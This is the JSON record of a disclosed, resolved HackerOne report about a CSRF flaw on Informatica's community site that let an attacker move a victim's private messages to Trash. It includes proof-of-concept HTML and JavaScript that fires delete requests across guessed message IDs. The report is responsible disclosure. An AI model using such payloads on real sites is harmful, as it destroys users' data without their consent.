{
  "id": 45050,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NTA1MA==",
  "url": "https://hackerone.com/reports/45050",
  "title": "[community.informatica.com] - CSRF in Private Messages allows to move user's messages to Trash",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2015-01-24T16:36:08.506Z",
  "submitted_at": "2015-01-24T16:36:08.506Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "artem",
    "url": "/artem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/2i1RS84yiWXNaegFdcLMbwu9/cccd3716a6d2e06174d2a41492445cb1d4bf85b4611a755bc810b9246a24d951"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 453,
    "url": "https://hackerone.com/informatica",
    "handle": "informatica",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Informatica",
      "twitter_handle": "informatica",
      "website": "https://www.informatica.com/",
      "about": "Informatica Corporation is the worldâ€™s number one independent provider of data integration software."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2016-03-02T02:46:07.403Z",
  "bug_reporter_agreed_on_going_public_at": "2016-02-01T02:45:50.139Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello,\r\n\r\nhttps://community.informatica.com/pm-delete.jspa doesn't check Referrer header or CSRF token when you move a message to Trash. As a result, an attacker can implement CSRF attack, and make a victim move messages to Trash. Then, according to the message on Trash page (https://community.informatica.com/pm.jspa?folderID=4), Trash is emptied daily. So a victim can lose messages.\r\n\r\nTo remove a message, an attacker needs to know a message ID. Message IDs seem to be global, so an attacker can do the following:\r\n- guess the current max message ID (for example, an attacker can send a message to yourself, and use this message ID)\r\n- try to remove N messages with IDs that belong to an interval [max_message_id - N, max_message_id]\r\n\r\nFor example, a script like the following may be placed on attacker's page:\r\n\r\n<html>\r\n <body>\r\n  <div id=\"delete\"></div>\r\n  <script>\r\n   var start_message_id = 16000;\r\n   var message_count = 100;\r\n   var text = \"\";\r\n   var message_id = start_message_id;\r\n   for (i = 0; i < message_count; i++) {\r\n     text += \"<img src=\\\"https://community.informatica.com/pm-delete.jspa?1&messageID=\" + message_id + \"\\\"\\/>\";\r\n     message_id++;\r\n   }\r\n   document.getElementById(\"delete\").innerHTML = text;\r\n  </script>\r\n </body>\r\n</html>\r\n\r\nWhen a victim loads the page above, the script will remove messages with IDs from 16000 to 16100. The script above sends a GET request for each possible message. As a result, it works quite slow. So it might be hard to remove all users messages because a victim should stay on the page before the script is finished.\r\n\r\nI tried to modify the script above to send a request for a batch of messages:\r\n\r\n<script>\r\n   var start_message_id = 15900;\r\n   var message_count = 200;\r\n   var N = 1;\r\n   var text = \"<img src=\\\"https://community.informatica.com/pm-delete.jspa?1\";\r\n   var message_id = start_message_id;\r\n   for (i = 0; i < message_count; i++) {\r\n     text += \"&messageID=\" + message_id;\r\n     if (i != 0 && i % N == 0) {\r\n       text += \"\\\"\\/>\";\r\n       document.getElementById(\"delete\").innerHTML += text;\r\n       text = \"<img src=\\\"https://community.informatica.com/pm-delete.jspa?1\";\r\n     }\r\n     message_id++;\r\n   }\r\n  </script>\r\n\r\nBut it doesn't seem to work fine. Seems the application stops removing if it finds not existing message ID.\r\n\r\nAnyway, it can damage user's data a lot. Please take a look.\r\n\r\nArtem",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-03-02T02:45:50.489Z",
  "allow_singular_disclosure_after": -250937387.13086608,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "shivammusic",
    "crazy4"
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
